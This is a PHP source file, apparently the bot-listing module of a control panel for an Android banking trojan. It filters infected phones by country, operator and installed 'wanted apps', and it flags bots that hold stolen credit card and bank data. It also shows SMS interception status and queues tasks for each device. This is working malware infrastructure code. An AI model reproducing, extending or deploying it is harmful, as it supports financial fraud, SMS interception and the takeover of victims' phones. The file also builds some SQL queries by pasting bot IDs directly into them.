<?php
require_once "cmd_mod.php";

class bots extends modBase
{
	protected $module_name = 'bots';

	function get_tag_select($selected='')
	{
		$vals = $this->db->exec("select tag from bots group by tag order by registered desc", null, true);
		$html = "<option value=''>All</option>";
		
		foreach($vals as $val)
		{
			$a = $val['tag'];
			
			if(!trim($a))
				continue;
			else
				if($a == $selected)
					$html .= "<option value='{$a}' selected>{$a}</option>";
				else
					$html .= "<option value='{$a}'>{$a}</option>";
		}

		return $html;
	}

	function get_last_seen_select($selected='')
	{
		$html = '<option value="0">Any</option>';
		foreach(hlp::$time_titles as $key=>$val)
			if($key == $selected)
				$html .= "<option value='{$key}' selected>{$val}</option>";
			else
				$html .= "<option value='{$key}'>{$val}</option>";
		
		return $html;
	}

	function get_filter()
	{
		$data = array();
		
		$filter_keys = array('tag', 'time_connect', 'android', 'bot_id', 'comment', 'operator', 'country', 'appname', 'lang', 'is_admin', 'is_sms_default_app', 'is_screen_enabled');
		
		foreach($filter_keys as $key)
		{
			if(in_array($key, array('is_admin', 'is_sms_default_app', 'is_screen_enabled')))
				$data['filter_' . $key] = (hlp::get($this->filter_values, $key, ''))? ' checked ' : '';
			else
				$data['filter_' . $key] = hlp::get($this->filter_values, $key, '');
				
			$data['patts_' . $key] = hlp::get(modBase::$filters, $key, modBase::$filters['text']);
		}
		
		$data['tag_list'] = $this->get_tag_select($data['filter_tag']);
		$data['last_seen_list'] = $this->get_last_seen_select($data['filter_time_connect']);
		
		$html = $this->draw_tpl('filter_bots', $data);
		return $this->get_filter_div($html);
	}
		
	function get_content()
	{
		#### these filters also used in cmd_bot.php - _set_command() - if($data['records'] == 'ALL')
		
		$this->filter_values['country'] = strtolower($this->filter_values['country']);
		
		// process time_connect 0, 1200, etc -- change to timestamp column
		$time_connect = (int) $this->filter_values['time_connect'];
		unset($this->filter_values['time_connect']);
		
		$contain_apps = hlp::list2array($this->filter_values['appname']);
		
		unset($this->filter_values['appname']);
		
		// all fields
		// deleted bots.`command`, bots.`result`, 
		$fields = 'bots.`id`, bots.`bot_id`, bots.`timestamp`, bots.`registered`, bots.`is_intercept`, bots.`comment`, bots.`imei`, bots.`country`, bots.`operator`, bots.`android`, bots.`model`, bots.`number`, bots.`marked_at`, bots.`tag`, bots.`is_screen_enabled`, bots.lang';
		
		// START SQL GENERATOR
		$sql = "SELECT %FIELDS% FROM bots";

		$sql = $this->addWhere($sql, $this->filter_values, array('android', 'bot_id', 'country'), 'bots');
		
		// bots have apps
		if($contain_apps)
		{
			$sql_apps = "`bots`.`bot_id` in( select bot_id from bot_apps where app_id in(select id from apps where name ";
			
			// 1 app searching with LIKE, more apps with IN()
			if(sizeof($contain_apps) == 1)
				$sql_apps .= "like({$this->db->quote_like($contain_apps[0])})";
			else
			{
				$contain_apps = array_map(array($this->db, 'quote'), $contain_apps);
				$apps_names = implode(",", $contain_apps);
				$sql_apps .= "in ({$apps_names})";
			}
			
			$sql_apps .= "))";
			$sql = $this->addWhere($sql, $sql_apps);
		}
		
		// last time connect
		if($time_connect)
		{
			$sql_time_connect = "`bots`.`timestamp` > date_sub(now(), interval {$time_connect} second)";
			$sql = $this->addWhere($sql, $sql_time_connect);
		}
		
		$sql .= " order by `timestamp` desc";
		
		// count request
		$total_rows = $this->db->exec(str_replace('%FIELDS%', 'count(bots.id)', $sql), null, true)[0][0];

		$paging = $this->get_limit($total_rows, $this->results_on_page);
		$sql .= $paging['sql'];
		
		// data request
		//~ return str_replace('%FIELDS%', $fields, $sql);
		$data = $this->db->exec(str_replace('%FIELDS%', $fields, $sql), null, true);

		if(!$data)
		{
			return $this->wrap_content("Total: {$paging['total_rows']}", '', $paging['pages']);
		}
		// ====================== Start generating content ====================

		
		
		
		$marked_apps_filtered = array_map(array($this->db, 'quote'), $this->client_cfg['wanted_apps_list']);
		$marked_apps_sql = implode(',', $marked_apps_filtered);
		
		$marked_bots = array();
		if(sizeof($marked_apps_filtered))
		foreach($data as $row)
		{
			$block_sql = "SELECT `name` FROM apps WHERE `name` in({$marked_apps_sql}) AND `id` in( 
				select app_id from bot_apps where bot_id = '{$row['bot_id']}'
				);";
				
			$res = $this->db->exec($block_sql, array(), true);
			if(sizeof($res))
			{
				$apps = array();
				foreach($res as $record)
					$apps[] = $record['name'];
					
				$marked_bots[$row['id']] = $apps;
			}
		}
		
		$bot_ids = array();
		foreach($data as $row)
			$bot_ids[] = $row['bot_id'];
		
		$bot_ids_str = implode("','", $bot_ids);
		
		
		// load has_cards, has_tasks
		$sql_cards = "select bot_id from bot_cards where bot_id in('{$bot_ids_str}')";
		$tmp = $this->db->exec($sql_cards, null, true);
		$bots_with_cards = array();
		if($tmp)
		foreach($tmp as $r)
			$bots_with_cards[] = $r['bot_id'];
		
		// load has_banks
		$sql_banks = "select bot_id from bot_banks where bot_id in('{$bot_ids_str}')";
		$tmp = $this->db->exec($sql_banks, null, true);
		$bots_with_banks = array();
		if($tmp)
		foreach($tmp as $r)
			$bots_with_banks[] = $r['bot_id'];
		
		// load has_tasks
		//~ $sql_tasks = "select bot_id from bot_tasks where bot_id in('{$bot_ids_str}')";
		//~ $tmp = $this->db->exec($sql_tasks, null, true);
		//~ $bots_with_tasks = array();
		//~ if($tmp)
		//~ foreach($tmp as $r)
			//~ $bots_with_tasks[] = $r['bot_id'];

		$headers = array();
		$headers[] = '<a href="javascript:select_all(\'input[id^=&quot;bots-table-chk-&quot;]\');undefined"><span class="fui-checkbox-checked" title="Check all" data-toggle="tooltip-down"></span></a>';
		$headers[] = '<i class="fa fa-credit-card" title="Has credit cards data" data-toggle="tooltip-down"></i>';
		$headers[] = '<i class="fa fa-institution" title="Has banks data" data-toggle="tooltip-down"></i>';
		$headers[] = '<span class="fui-android" title="Android version" data-toggle="tooltip-down"></span>';
		$headers[] = '<i style="color: black" class="fa fa-inverse fa-warning" title="Has wanted apps or marked manually" data-toggle="tooltip-down"></i>';

		$headers[] = 'Bot';
		$headers[] = '<i class="fa fa-flag" title="Country and Language" data-toggle="tooltip-down"></i>';
		$headers[] = 'Operator';
		$headers[] = 'Last seen';
					
		$headers[] = 'Tasks';
		$headers[] = '<i class="fa fa-exchange" title="SMS Intercept" data-toggle="tooltip-down"></i>';
		$headers[] = 'Tag';
		$headers[] = 'Number';
		$headers[] = 'Comment';
	
		$rows = array();
		foreach($data as $row)
		{
			//~ $rows[] = array($bot[0], $bot[0], $bot[0], $bot[0], $bot[0]);
			$tmp = array();
			$tmp[] = "<label class='checkbox' for='bots-table-chk-{$row['bot_id']}'>
					<input type='checkbox' value='{$row['bot_id']}' id='bots-table-chk-{$row['bot_id']}' data-toggle='checkbox' />
				</label>";
				
			$tmp[] = (in_array($row['bot_id'], $bots_with_cards))? "<a title='Show cards' href='#page:menu-cards;bot_id={$row['bot_id']}'><img src='r/img/dollar.png' width='36' /></a>" : '&nbsp;'; 
			
			$tmp[] = (in_array($row['bot_id'], $bots_with_banks))? "<a title='Show Banks' href='#page:menu-banks;bot_id={$row['bot_id']}'><img src='r/img/dollar_stack.png' width='36' /></a>" : '&nbsp;'; 
			
			$tmp[] = "<a href='#page:menu-bots;bots-filter-android={$row['android']}' title='Filter by Android version'>{$row['android']}</a>";
			
			// if has wanted apps or marked manually by setting 'marked_at'
			$tmp[] = (array_key_exists($row['id'], $marked_bots) || $row['marked_at'] !== null)?
			 $this->get_marked_cell($row['marked_at'], hlp::get($marked_bots, $row['id'], array())) : '&nbsp;';
			
			$tmp[] = "<a href='#page:menu-bot;bot_id={$row['bot_id']}'>Details</a>";
			
			$tmp[] = hlp::get_flag($row['country'], 'Country: ', false) . hlp::get_flag($row['lang'], 'Phone language: ', true);
			$tmp[] = ($row['operator'] && $row['operator'] != '0')? $row['operator'] : hlp::na_value();
			
			$tmp[] = $this->get_indicator_cell($row['timestamp']);
			
			$tmp[] = $this->get_tasks_button($row['bot_id']); 
			
			$tmp[] = ($row['is_intercept'] == '1') ?  
				hlp::get_bool_icon('SMS Intercept enabled', true) : hlp::get_bool_icon('SMS Intercept disabled');
			
			$tmp[] = "<a href='#page:menu-bots;bots-filter-tag={$row['tag']}' title='Filter by Tag'>{$row['tag']}</a>";
			
			$tmp[] = $this->get_number_cell($row);
			$tmp[] = $this->get_comment_cell($row);
			
			$rows[] = $tmp;
		}
		
		$content = $this->get_table($rows, $headers, 'textcenter');
		
		$buttons = array();
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}

	function get_tasks_button($bot_id)
	{
		$params = array(
			array(':bot_id', $bot_id, PDO::PARAM_STR, 32),
		);
		$info = $this->db->exec("select status, count(status) from bot_tasks where bot_id=:bot_id group by status", $params, true);
		if(!$info)
			return "&#151;";
			
		$html = <<<PHP
<button 
			type='button' 
			style='border: 1px solid white;'
			class='btn btn-xs'
			onclick='go_to_hash("tasks", {"bot_id": "{$bot_id}", "status": ""})'
			data-toggle="tooltip" title='All tasks'>all</button>
PHP;

		$i = 0;
		foreach($info as $row)
		{
			$i++;
			$status = $row['status'];
			$status_name = strip_tags(hlp::$tasks_statuses[$status]);
			$count = $row[1];
			
			$class = hlp::get(hlp::$tasks_classes, $status, '');
			
			$html .= <<<PHP
		<button 
			type='button' 
			class='btn btn-xs {$class}'
			onclick='go_to_hash("tasks", {"bot_id": "{$bot_id}", "status": "{$status}"})'
			data-toggle="tooltip" title='{$status_name}'>{$count}</button>
PHP;
			if($i == 3)
				$html .= "<br />";
		}

		return $html;
	}
	
	function get_indicator_cell($ts)
	{
		$rowdate = hlp::human_date($ts);
		return hlp::get_indicator($ts) ."<br /><small style='font-size: 9pt'>{$rowdate}</small>";
	}

	function get_number_cell($bot_row)
	{
		$number = ($bot_row['number'] != '0')? trim($bot_row['number']) : '';
		
		return <<<PHP
	<textarea rows='1' placeholder='Not detected' class='form-control commentArea' cols='11'  id="bot_number-{$bot_row['id']}" onkeypress="show_save_button(this)">{$number}</textarea>
	<button id='button-bot_number-{$bot_row['id']}' style='width: 100%; display: none' type='button' class='btn btn-info' onclick="save_comment('{$bot_row['id']}', 'bot_number')"><i class="fa fa-save" title=""></i></button>
PHP;
	}
	
	function get_marked_cell($bl_time, $marked_apps)
	{
		$title = $msg = '';
		if($bl_time)
		{
			$title = "Marked manually at " . hlp::human_date($bl_time);
			$msg = $title;
			$title = '';
		}
		
		if($marked_apps)
		{
			if($title) $title .= "; ";
			if($msg) $msg .= "; ";
			
			$title .= "Has wanted apps: " . implode(', ', $marked_apps);
			$msg .= $title;
		}

		return <<<PHP
		<button type='button' onclick='msg("Info", "{$msg}", false)' class='btn btn-circle btn-xs btn-danger' title='{$msg}'><i class='fa fa-inverse fa-warning'></i></button>
PHP;
	}
}





















